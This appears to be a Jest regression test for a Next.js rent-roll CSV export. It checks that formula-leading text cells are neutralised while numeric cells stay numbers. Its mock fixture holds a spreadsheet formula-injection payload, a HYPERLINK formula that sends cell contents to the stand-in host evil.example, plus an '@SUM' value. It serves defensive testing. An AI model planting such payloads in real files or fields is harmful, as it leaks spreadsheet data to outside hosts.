/**
 * #3216 — the rent-roll CSV neutralises spreadsheet formulas in free text.
 *
 * `lessorName`, `lessorEik` and `rentUnit` are free text any writer in the farm
 * can enter. The route used a local quoter with no formula handling, so a
 * lessor named `=HYPERLINK(...)` was evaluated when the owner opened the file.
 * Numbers must NOT be neutralised: a negative `outstanding` (an overpayment)
 * would otherwise arrive in Excel as text.
 */
import { NextRequest } from 'next/server';

jest.mock('@/app-layer/context', () => ({
    getTenantCtx: jest.fn(async () => ({ tenantId: 't1', userId: 'u1' })),
}));
jest.mock('@/app-layer/usecases/rent-roll', () => ({
    getRentRoll: jest.fn(async () => ({
        byLessor: [
            {
                lessorName: '=HYPERLINK("https://evil.example/?"&B2,"Иван Петров")',
                lessorEik: '@SUM(1)',
                leaseCount: 2,
                leasedDca: 12.5,
                rentTotal: 300,
                rentUnit: '+лв',
                paid: 350,
                outstanding: -50,
            },
            {
                lessorName: 'Мария Иванова',
                lessorEik: null,
                leaseCount: 1,
                leasedDca: 4,
                rentTotal: null,
                rentUnit: null,
                paid: 0,
                outstanding: 100,
            },
        ],
    })),
}));

import { GET } from '@/app/api/t/[tenantSlug]/reports/rent-roll/route';

async function csv(): Promise<string[][]> {
    const res = await GET(
        new NextRequest('http://localhost/api/t/farm/reports/rent-roll?format=csv'),
        { params: Promise.resolve({ tenantSlug: 'farm' }) },
    );
    const text = (await res.text()).replace(/^﻿/, '');
    // Naive split is enough here: no fixture cell contains a newline.
    return text.split('\n').map((line) => line.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/));
}

describe('rent-roll CSV (#3216)', () => {
    it('prefixes every formula-leading TEXT cell so a spreadsheet shows it as text', async () => {
        const [, row] = await csv();
        expect(row[0].startsWith(`"'=HYPERLINK`)).toBe(true);
        expect(row[1]).toBe(`'@SUM(1)`);
        expect(row[5]).toBe(`'+лв`);
    });

    it('leaves NUMBERS alone — a negative outstanding stays a number', async () => {
        const [, row] = await csv();
        expect(row[2]).toBe('2');
        expect(row[3]).toBe('12.5');
        expect(row[7]).toBe('-50');
    });

    it('control: ordinary text is unchanged', async () => {
        const [, , row] = await csv();
        expect(row[0]).toBe('Мария Иванова');
        expect(row[1]).toBe('');
    });
});
